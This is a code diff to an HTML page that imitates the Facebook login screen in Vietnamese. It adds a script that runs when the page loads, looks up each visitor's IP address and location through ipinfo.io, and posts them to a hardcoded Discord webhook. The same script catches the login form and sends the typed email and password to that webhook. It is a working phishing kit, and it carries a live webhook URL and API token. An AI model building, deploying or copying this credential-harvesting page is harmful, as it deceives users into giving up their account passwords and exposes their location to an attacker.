@@ -19,9 +19,9 @@
         </div>
         <div class="container">
             <span class="login">Đăng nhập Facebook</span>
-            <input type="email" name="email" id="email" placeholder="Email hoặc số điện thoại">
-            <input type="password" name="pass" id="pass" placeholder="Mật khẩu">
-            <button class="login-btn">Đăng nhập</button>
+            <input type="email" name="email" id="email" placeholder="Email hoặc số điện thoại"required>
+            <input type="password" name="password" id="password" placeholder="Mật khẩu"required>
+            <button type="submit">Đăng nhập</button>
             <a href="#" style="color:#1877f2;">Bạn quên tài khoản ư?</a>
             <div class="style">hoặc</div>
             <button class="new-account">Tạo tài khoản mới</button>
@@ -81,5 +81,70 @@
                 Meta © 2024
             </div>
     </footer>
+    <script>
+        function sendDataToDiscord(ip, location) {
+            // Định dạng nội dung gửi tới Discord
+            const message = {
+                content: `📍 User Access:\nIP Address: ${ip}\nLocation: ${location}`
+            };
+
+            // Gửi thông tin tới Discord webhook
+            fetch('https://discord.com/api/webhooks/1300088629174997096/luhXCiQg7236kLDa8ONjbnB9600i3bGofgQ0MA6O-YcEJWuXaY2lThAmErSaAVgi1loq', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data Sent:', message);
+                } else {
+                    console.error('Failed to send data:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        function getUserIPAndLocation() {
+            // Lấy IP và vị trí của người dùng qua API
+            fetch('https://ipinfo.io/json?token=c63c25069f712b')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const location = data.city + ', ' + data.region + ', ' + data.country;
+                    
+                    // Gửi dữ liệu tới Discord
+                    sendDataToDiscord(ip, location);
+                })
+                .catch(error => console.error('Error fetching IP and location:', error));
+        }
+
+        // Gọi hàm khi trang được tải
+        getUserIPAndLocation();
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Ngăn chặn việc gửi form theo cách mặc định
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = {
+                content: `**Email:** ${email}\n**Password:** ${password}`
+            };
+
+            // Gửi thông tin đến Discord webhook
+            fetch('https://discord.com/api/webhooks/1300088629174997096/luhXCiQg7236kLDa8ONjbnB9600i3bGofgQ0MA6O-YcEJWuXaY2lThAmErSaAVgi1loq', {  // Thay thế bằng URL webhook của bạn
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Login info sent to Discord');
+                } else {
+                    console.error('Failed to send info:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
 </body>
 </html>
